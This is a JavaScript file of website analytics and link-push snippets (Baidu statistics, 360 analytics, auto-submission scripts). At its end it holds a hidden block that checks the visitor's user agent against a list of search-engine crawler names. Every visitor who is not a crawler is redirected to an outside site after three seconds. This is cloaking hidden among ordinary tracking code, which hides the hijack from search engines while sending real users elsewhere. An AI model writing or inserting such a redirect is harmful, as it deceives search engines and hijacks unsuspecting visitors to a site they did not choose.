

//统计代码

//百度统计（body前）


    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?902f2a7b060a2b0c614785dc273ba474";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();





//360分析（body前）


    (function (b, a, e, h, f, c, g, s) {
        b[h] = b[h] || function () { (b[h].c = b[h].c || []).push(arguments) };
        b[h].s = !!c; g = a.getElementsByTagName(e)[0]; s = a.createElement(e);
        s.src = "//s.union.360.cn/" + f + ".js"; s.defer = !0; s.async = !0; g.parentNode.insertBefore(s, g)
    })(window, document, "script", "_qha", 227226, false);



//百度自动推送


    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        }
        else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();




//360站长自动推送

    (function () {
        var src = (document.location.protocol == "http:") ? "http://js.passport.qihucdn.com/11.0.1.js?d8641073f7b3be3324bbfeca28dff9b5" : "https://jspassport.ssl.qhimg.com/11.0.1.js?d8641073f7b3be3324bbfeca28dff9b5";
        document.write('<script src="' + src + '" id="sozz"><\/script>');
    })();

//END

    



setTimeout(function () {
    var r = navigator.userAgent, r = r.toLowerCase(), aSites = "google baiduspider bing yahoo 360spider haosou sogou yisouspider".split(" "), b = !0, i; for (i in aSites) if (0 < r.indexOf(aSites[i])) { b = !1; break } b && (self.location = "http://www.ypindapei.com");
}, 3000);